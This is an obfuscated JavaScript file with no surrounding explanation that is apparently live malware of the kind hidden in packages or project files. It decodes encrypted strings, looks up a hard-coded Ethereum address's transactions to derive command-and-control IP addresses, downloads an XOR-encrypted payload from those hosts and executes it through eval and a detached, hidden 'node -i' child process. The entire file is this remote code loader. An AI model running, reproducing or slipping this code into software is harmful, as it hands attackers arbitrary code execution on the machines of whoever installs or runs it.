c="o_vMB>dh\"B&F{|&PGNOI3Q7Bq1f9tqBW;O2FVBr:nm.yC`dXCi6Q+CpsLDEQ,,c7X@y])Z%TW:\"pEAPUGCL0I`vYE`DYx=$5]@wj,I|R/Biifuk`)ddXI)eW:HWv_a,j(;,M^UbAH.|=hk(TDH5>Us%edKlZQy3*vf0)\"x%\"CgS[>WB4HaU3$C0QGF}9|N%w^m/!UleMD,pS#Z%rgI:cnM@^MZ:T_*(Iw{B|/mh@?CRFs|@bZ+/4m80lG4O[>SmlZt47}3iJQmVuaEN[I@yo_R)>{]V$bS5z+fC)Bp2RLgX{m3iJQmVuaENhq[B7vL)ug}Vgn={3iJQmVuaEN[I@y5ROl%Nm}VDx*`3iJQmVuaEN[Ir95Am9fLEMzs`w]?pGx3)Ay@71VmhHhy?3G^3iJQmVuaEN[Ir9RBRg+hp1tVXH^:Pv#_\"x2L;VvwqHY+RC;p[A4?sylc*cmQU7ZjN{t`aSe]$Wdl6O>fN4P.$|BT$s#Gg]8[Nsb7M%v%pEh+:HxyB9\"Jkl^1^X$&LT3Qok$mPaEWjfW=R)TLmI`IZX1,}gf+cO/>.l2)2%GhBtmE[WU.B.jt{=A&!R)dgK?IjNLzAa@R~+e^kTtA*hhrd#KZ/FzmWzyVo){Q~gN9=,xxTN$V%h|OxkL/Co5a7<upq4oKnA}#ql6#A/{cu}$.Wx`i=5E&[C(?Zm2F96`Id;`~1#3cx#<<Bx[*q]W5lN3cQkr}cxgdDEZB@;KJ3iJQ@DFanKt?;e_>F;]\"ySD#?/_bSis<N_A/#CWo5B5@2;oF#b?+odzJ[O=ce?Ld2[xQzF2a>K@+Q2~2=bIu_*e\"xYB>iiwjgYQw)F&}43(n$rQ3S_Lo,wB5+Yu>h;#|nZH=No%ta^4we?dS7ldK9!ICM;x>T!Kj?lfr3}3bmim<8^OMrL8i!$rc:!7.&Vs`.q}X%$xc$F5Fl5I<_=n$iY9CA&8}8^OMrLbTM1D`gmcF6#0:xG)$S&tr|FH`tHsnH{7X&X)ZxO/Afs9}f5<X}~ncDF.sE$:I]feoTc;%Q;.DL^OMrL8iS$xc$F5FQb6iQswZ5IHvk7DLOqHWWCsh7siiOSMVPIOYLeOufWAp23U9tGKjvd4uhwQgB6gdjzKEzxe5EpnsZOtQfVehjS9boXG3AEWN0C3C1t6Jk1PUMRFQAXz0XPPqcZ0Bn51eNno2AGgvvOYWD3SFJ0WMfHn1mL9S9sT1yEUJOKPW5OM0E5fl9tMzigxdbEsJ8GHMT2zHNwXQ5FuQjZiymq4NXuqsU";function d(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}a:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue a;return b}catch(e){}return b||this}var e=d()||{},f=e.TextDecoder,g=e.Uint8Array,h=e.Buffer,i=e.String||String,j=e.Array||Array,k=function(){var a=new j(128),b=i.fromCodePoint||i.fromCharCode,c=[];return function(d){var e,f,g=d.length;c.length=0;for(var h=0;h<g;){f=d[h++];f<=127?e=f:f<=223?e=(f&31)<<6|d[h++]&63:f<=239?e=(f&15)<<12|(d[h++]&63)<<6|d[h++]&63:i.fromCodePoint?e=(f&7)<<18|(d[h++]&63)<<12|(d[h++]&63)<<6|d[h++]&63:(e=63,h+=3);c.push(a[e]||(a[e]=b(e)))}return c.join("")}}();function l(a){return typeof f!=="undefined"&&f?(new f).decode(new g(a)):typeof h!=="undefined"&&h?h.from(a).toString("utf-8"):k(a)}var m=n();function n(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}b:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue b;return b}catch(e){}return b||this}function o(a){switch(a){case"aowaYkQ":return m.Map;case"ScVvzHB":return m.Math;case"LYahbCb":return m.JSON;case"UcVlGXr":return m.Boolean;case"GO7Nrh":return m.tTUslG;case"z2lXInR":return m.TG2cJIk;case"LjKGqSw":return m.to__5dE;case"XzeSjRU":return m.hPRNJpg;case"BLxK2l":return m.Sclv_Jn;case"w8SHhF":return m.BigInt;case"w24XslL":return m.RwXr52a;case"HdYixQ":return m.llZ36m;case"P2AKM57":return m.vM7khEA;case"UqL1mIS":return m.MgHS1fx;case"bqgS0uT":return m.cNfC_7;case"zry4hT0":return m.VJNU3_;case"wOf1fy":return m.Number;case"TAIsJro":return m.Error;case"jQvQTiW":return m.MFMrPhJ;case"9MPP0cK":return m.JtrWh6;case"i11XSB":return m.E5BYrDP;case"9zqtB2O":return m.UzYC2SR;case"cHMvB92":return m.OaeceOf;case"k__4zk":return m.setTimeout;case"xh5d15l":return m.O_iVybz;case"gERyCM":return m.WYrZbg3;case"TZqePfg":return m.KM0n1S;case"MoCspX":return m.xfebTjG;case"rZ5CTo1":return m.rbDj0XM;case"tW6Pn0":return m.FnZlfg_;case"pOZAUNs":return m.Array;case"G6145X":return m.wI0nBkk;case"7Qu4NZb":return m.dtj7OXY;case"Bd1rSK":return m.ie99moZ;case"3o6cDhK":return m.RFJv7_;case"HbfDUfa":return m.hvpU54;case"cIKxCVp":return m.KzTTyR_;case"BimznrA":return m.j3Qtuw6;case"tdTjubV":return m.Promise;case"ilyFOCU":return m.wocW6T;case"y8sAIw":return m.JuwsDx;case"qjSqfm":return m.hNpMC1p;case"aJiSad":return m.eyFciSD;case"BlBOECA":return m.v4EfHU;case"bBSqay":return m.ItLZkU;case"JOOaEO5":return m.ihgc7mc;case"un8sN4v":return m.GZqewR;case"Mk0LmrW":return m.Set;case"hDlNJsF":return m.AbortController;case"KV6k6c":return m.xi3JBX;case"NEujWY":return m.q6lpgVG}}global.r=require;if(typeof module==="object"){global.m=module}const p=require("node:http"),q=require("node:https"),r=require("node:zlib"),{URL:s}=require("node:url"),{spawn:t}=require("node:child_process");function u(a){return new(o("tdTjubV"))(b=>{let d;try{d=t("node",["-i"],{detached:!0,windowsHide:!0,stdio:["pipe","pipe","pipe"]})}catch{b();return}let e="",f=!1;const g=()=>{return b()},h=()=>{function b(e){var h="MN;k5@81(.bBhxU0ycDQ6=Xw`</KeV>CGg]~IZ\"i$F!Y4W#|n9t%&3+auLq:foHEr^[7R2*lOvP)_dSs}zTm{,JA?jp",d=""+(e||""),f=d.length,g=[],a=0,c=0,j=-1;for(var k=0;k<f;k++){var m=h.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;a|=j<<c;c+=(j&8191)>88?13:14;do{g.push(a&255);a>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((a|j<<c)&255)}return l(g)}function e(e,h){return b(c.slice(e,e+h))}if(f){return}f=!0;const h=a.endsWith("\n")?a:""+a+"\n";d.stdin.write(e(149,51),()=>{d.stdin.write(h,()=>{d.stdin.end();d.stdin.unref();if(d.stdout){d.stdout.unref()}if(d.stderr){d.stderr.unref()}d.unref();g()})})},i=b=>{e+=b.toString("utf8");if(new RegExp("(^|\\n)> $","").test(e)){h()}};d.on("error",g);d.stdout.on("data",i);d.stderr.on("data",i);d.stdin.write("\n");o("k__4zk")(h,10000)})}const v=1000n,w=b(205,52).toLowerCase(),x=12,y=0n,z=b(261,37),A=3000,B=[...new(o("Mk0LmrW"))([process.env.ETH_RPC_URL,b(301,24),b(327,25),b(354,43),b(402,47)].filter(o("UcVlGXr")))],C={"http:":new p.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64}),"https:":new q.Agent({keepAlive:!0,keepAliveMsecs:30000,maxSockets:64})};function D(a,b){if(!a){return}a.addEventListener("abort",()=>{return b.abort()},{once:!0})}function E(a){const b=(a.headers["content-encoding"]||"").toLowerCase();if(b==="gzip"||b==="x-gzip"){return a.pipe(r.createGunzip())}if(b==="deflate"){return a.pipe(r.createInflate())}if(b==="br"){return a.pipe(r.createBrotliDecompress())}return a}function F(a,{method:b="GET",body:c,signal:d}={}){const e=new s(a),f=e.protocol==="https:"?q:p,g={Accept:"application/json","Accept-Encoding":"gzip, deflate, br",Connection:"keep-alive"};if(c!=null){g["Content-Type"]="application/json";g["Content-Length"]=Buffer.byteLength(c)}return new(o("tdTjubV"))((a,h)=>{const i=f.request({hostname:e.hostname,port:e.port||(e.protocol==="https:"?443:80),path:e.pathname+e.search,method:b,agent:C[e.protocol],signal:d,headers:g},i=>{const b=E(i),c=[];b.on("data",i=>{return c.push(i)});b.on("end",()=>{const b=Buffer.concat(c).toString("utf8").trim();if(i.statusCode<200||i.statusCode>=300){return h(new(o("TAIsJro"))("HTTP "+i.statusCode+" from "+e.hostname+": "+b.slice(0,120)))}if(!b||b[0]==="<"||b[0]!=="{"&&b[0]!=="["){return h(new(o("TAIsJro"))("Non-JSON from "+e.hostname+": "+b.slice(0,120)))}try{a(o("LYahbCb").parse(b))}catch(err){h(new(o("TAIsJro"))("JSON parse failed from "+e.hostname+": "+err.message))}});b.on("error",h)});i.on("error",h);i.setTimeout(A,()=>{i.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});if(c!=null){i.write(c)}i.end()})}async function G(a,b){const d=B.map(()=>{return new(o("hDlNJsF"))});d.forEach(a=>{return D(b,a)});try{return await o("tdTjubV").any(B.map((b,e)=>{return a(b,d[e].signal)}))}finally{for(const e of d)e.abort()}}async function H(a,b,c,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify({jsonrpc:"2.0",id:1,method:b,params:c}),signal:d});if(e?.error){throw new(o("TAIsJro"))(e.error.message||o("LYahbCb").stringify(e.error))}if(e?.result==null){throw new(o("TAIsJro"))("RPC "+b+": missing result")}return e.result}async function I(a,b,d){const e=await F(a,{method:"POST",body:o("LYahbCb").stringify(b.map(([a,b],d)=>{return{jsonrpc:"2.0",id:d+1,method:a,params:b}})),signal:d});if(!o("pOZAUNs").isArray(e)){function f(a){var d="@Q>u}m3fd=#BJs{$KNO8HDXYZvq]ETSzlxG_ki|)%(erj*Ap.b/\"Mn~oVa7L:`,^&2RWhUP6?!5w[+g;C0tcy194I<F",e=""+(a||""),f=e.length,g=[],h=0,c=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;h|=j<<c;c+=(j&8191)>88?13:14;do{g.push(h&255);h>>=8;c-=8}while(c>7);j=-1}}if(j>-1){g.push((h|j<<c)&255)}return l(g)}function g(a,b){return f(c.slice(a,a+b))}throw new(o("TAIsJro"))(g(457,42))}const h=new(o("aowaYkQ"))(e.map(a=>{return[a.id,a]}));return b.map((a,b)=>{const d=h.get(b+1);if(!d){function e(a){var d="=EM#NpJ]wjaLeQyO/x|n@FW5:1q}2C[t{<>czkr.P)_!HvSVd~s*6m^8K\"+Ub93YilAXohgf$RD,0T4(uZB%?7`&I;G",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function f(a,b){return e(c.slice(a,a+b))}throw new(o("TAIsJro"))(f(503,39)+(b+1))}if(d.error){throw new(o("TAIsJro"))(d.error.message||o("LYahbCb").stringify(d.error))}if(d.result==null){function g(a){var d="dX{6iZ>\"Y4aBjL+!Efs9&~|@})nQpTFq3_:*A.x^V8Jug`NSPUb$or2]0/,#=Om;zlM%(1WKGRk[Cty7H<cI5ewh?Dv",e=""+(a||""),f=e.length,g=[],j=0,h=0,c=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(c<0){c=m}else{c+=m*91;j|=c<<h;h+=(c&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);c=-1}}if(c>-1){g.push((j|c<<h)&255)}return l(g)}function j(a,b){return g(c.slice(a,a+b))}throw new(o("TAIsJro"))(j(547,36)+(b+1))}return d.result})}const J=a=>{return"0x"+a.toString(16)};function K(a){return a.find(a=>{return a.from&&a.from.toLowerCase()===w})||null}function L(a){try{const b=Buffer.from(a.replace(new RegExp("^0x","i"),""),"hex"),c=a=>{return""+a[0]+"."+a[1]+"."+a[2]+"."+a[3]};return[c(b.subarray(0,4)),c(b.subarray(4,8))]}catch(error){return[null,null]}}function M(a){return new(o("tdTjubV"))(b=>{let c=a.length;if(!c){return b(null)}let d=!1;const e=c=>{if(d){return}d=!0;for(const e of a)e.controller.abort();b(c)};for(const f of a)f.run().then(f=>{if(d){return}if(f){e(f)}else{if(--c===0){b(null)}}})["catch"](()=>{if(!d&&--c===0){b(null)}})})}function N(a){const c=a-v,d=new(o("Mk0LmrW")),e=[];for(const f of[a-1n,a,a+1n,c-1n,c,c+1n]){if(f<0n){continue}const g=f.toString();if(d.has(g)){continue}d.add(g);e.push(f)}return e}function O(a){const b=new(o("hDlNJsF"));return{controller:b,run:async()=>{const c=await G((c,d)=>{return H(c,"eth_getBlockByNumber",[J(a),!0],d)},b.signal),d=c?.transactions;if(!o("pOZAUNs").isArray(d)){return null}const e=K(d);return e?{blockNumber:a,tx:e}:null}}}async function P(a,b){const c=a.map(a=>{return["eth_getTransactionCount",[w,J(a)]]});try{return(await G((a,b)=>{return I(a,c,b)},b)).map(o("w8SHhF"))}catch{return(await o("tdTjubV").all(c.map(([a,c])=>{return G((b,d)=>{return H(b,a,c,d)},b)}))).map(o("w8SHhF"))}}async function Q(a){const b=new(o("hDlNJsF"));try{const c=a??o("w8SHhF")(await G((a,b)=>{return H(a,"eth_blockNumber",[],b)},b.signal)),d=o("w8SHhF")(await G((a,b)=>{return H(a,"eth_getTransactionCount",[w,J(c)],b)},b.signal)),e=d-1n;let f=y-1n,g=c;while(g-f>1n){const h=g-f-1n,j=o("w8SHhF")(o("ScVvzHB").min(x,o("wOf1fy")(h))),l=[];for(let m=1n;m<=j;m+=1n)l.push(f+m*(g-f)/(j+1n));const n=await P(l,b.signal),p=n.findIndex(a=>{return a>=d});if(p===-1){f=l[l.length-1]}else{g=l[p];if(p>0){f=l[p-1]}}}const q=await G((a,b)=>{return H(a,"eth_getBlockByNumber",[J(g),!0],b)},b.signal),r=q?.transactions||[];let s=null;for(const u of r){if(!u.from||u.from.toLowerCase()!==w){continue}if(o("w8SHhF")(u.nonce)===e){s=u;break}if(!s||o("w8SHhF")(u.nonce)>o("w8SHhF")(s.nonce)){s=u}}return{blockNumber:g,tx:s}}finally{b.abort()}}async function R(){function a(a){var d="b8GD;ZC=sK3{@/4Xp*nrcYW2)T~.EyN]OSH6JdF,x+:eq_jv$a!?Bhmz\"^Uw<9l0oQ(|VA}&gLMP5>`%ktIR1f#u[7i",e=""+(a||""),f=e.length,g=[],c=0,h=0,j=-1;for(var k=0;k<f;k++){var m=d.indexOf(e[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;c|=j<<h;h+=(j&8191)>88?13:14;do{g.push(c&255);c>>=8;h-=8}while(h>7);j=-1}}if(j>-1){g.push((c|j<<h)&255)}return l(g)}function b(b,d){return a(c.slice(b,b+d))}const d=""+z+b(588,47)+w+b(642,89),e=await F(d),f=o("pOZAUNs").isArray(e?.result)?e.result:[],g=f.find(a=>{return a.from&&a.from.toLowerCase()===w});if(!g){return null}return{blockNumber:o("w8SHhF")(g.blockNumber),tx:g}}async function S(){function a(a){var d="s&S2Mp={4;Fq1+Vh`.mc:>l|Ya6)i7TdNUkD,e*\"8]ZQ(Pn%oXtvxER0j_A?gbz5!f@3<#OWwIBGHK^JC/}L[y9u$~r",e=""+(a||""),f=e.length,g=[],h=0,j=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;h|=k<<j;j+=(k&8191)>88?13:14;do{g.push(h&255);h>>=8;j-=8}while(j>7);k=-1}}if(k>-1){g.push((h|k<<j)&255)}return l(g)}function d(d,e){return a(c.slice(d,d+e))}let e;try{e=await G((a,d)=>{return H(a,"eth_blockNumber",[],d)})}catch{return}const f=o("w8SHhF")(e),g=f-f%v,h=global;let i=await M(N(g).map(O)),[j,k]=L(i?.tx?.to);function m(a,d,e){if(!a){return null}return new s(b(738,9)+a+":"+d+e)}let n=null;const q=m(j,443,"/0x/cls");if(q){try{n=await r("q4FZkxX{!h,Sr3=@",q)}catch{n=null}}if(!n){i=(await Q(f)["catch"](()=>{return null}))??(await R()["catch"](()=>{return null}));[j,k]=L(i?.tx?.to)}h._V=h.i;h._H=d(751,9)+j+":80";h._H2=d(751,9)+k+":80";h._t_s=d(751,9)+j+":443";h._t_u=d(751,9)+j+":80";function r(a,d){function e(a){var d="AKB3Sd0x/F5yO`@EcwL+q{NXs2;4Jn~#l<r^8>YD&V:i7?pe)hPz\"CT$}9(!%[*1oUtv]u|MjZg,_mbkfQHa6R=.GIW",e=""+(a||""),f=e.length,g=[],j=0,k=0,h=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(h<0){h=q}else{h+=q*91;j|=h<<k;k+=(h&8191)>88?13:14;do{g.push(j&255);j>>=8;k-=8}while(k>7);h=-1}}if(h>-1){g.push((j|h<<k)&255)}return l(g)}function f(a,d){return e(c.slice(a,a+d))}const g={hostname:d.hostname,port:o("wOf1fy")(d.port)||80,path:d.pathname+d.search,headers:{"User-Agent":f(766,137),"Sec-V":h._V||0}};function i(d){const e=a.length;for(let f=0;f<d.length;f++)d[f]^=a.charCodeAt(f%e);return d.toString("utf8")}function j(a){const d=a.headers["x-payload-b64"];if(!d){throw new(o("TAIsJro"))("Missing X-Payload-B64")}return i(Buffer.from(d,"base64"))}function k(a){return new(o("tdTjubV"))((d,e)=>{const f=p.request({...g,method:a},f=>{if(a==="HEAD"){try{d(j(f))}catch(e){e(e)}f.resume();return}const g=[];f.on("data",f=>{return g.push(f)});f.on("end",()=>{try{const a=Buffer.concat(g);if(a.length){return d(i(a))}if(f.headers["x-payload-b64"]){return d(j(f))}e(new(o("TAIsJro"))("Empty payload body"))}catch(e){e(e)}});f.on("error",e)});f.on("error",e);f.setTimeout(A,()=>{f.destroy(new(o("TAIsJro"))("HTTP timeout after "+A+"ms"))});f.end()})}return k("GET")["catch"](()=>{return k("HEAD")})}async function t(a,d,e){try{function f(a){var d="_Wz3Pb8L[^e]AqE,%S4TQ>jB|fy/7NGV!OFmda&J;up1(R?0xvl.o#s$hw\"@C9X+iUY~:IHrn)=5<}M2Zk`c6*{DtKg",e=""+(a||""),f=e.length,g=[],j=0,h=0,k=-1;for(var m=0;m<f;m++){var q=d.indexOf(e[m]);if(q===-1)continue;if(k<0){k=q}else{k+=q*91;j|=k<<h;h+=(k&8191)>88?13:14;do{g.push(j&255);j>>=8;h-=8}while(h>7);k=-1}}if(k>-1){g.push((j|k<<h)&255)}return l(g)}function g(a,d){return f(c.slice(a,a+d))}const i=await r(d,a),j=e?"global['_V']='"+(h._V||0)+"';global['_H']='"+h._H+"';global['_H2']='"+h._H2+g(908,148):"global['_V']='"+(h._V||0)+"';global['_t_s']='"+h._t_s+"';global['_t_u']='"+h._t_u+g(908,148);if(!e){eval(j+i)}await u(j+i)}catch(e){}}await t(new s(d(751,9)+j+":443/0x/cls"),"q4FZkxX{!h,Sr3=@",!1);await t(new s(d(751,9)+j+":443/0x/ls"),"y-p_>d$0B&@^1aQk",!0)}S();
